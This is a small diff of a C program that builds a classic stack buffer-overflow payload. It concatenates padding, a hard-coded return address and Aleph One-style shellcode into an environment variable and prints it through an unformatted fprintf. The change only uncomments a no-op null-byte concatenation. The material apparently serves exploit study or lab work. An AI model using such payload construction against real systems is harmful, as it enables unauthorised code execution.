@@ -40,7 +40,7 @@ int main(void)
   strcat(envvar, "AAAA");
   strcat(envvar, "\x97\xff\xff\xbf");
   strcat(envvar, shellcodeAlephOne);
-  // strcat(envvar, "\0");
+  strcat(envvar, "\0");
   // printf("%s", envvar);
   fprintf(stdout, envvar);
   free(envvar);
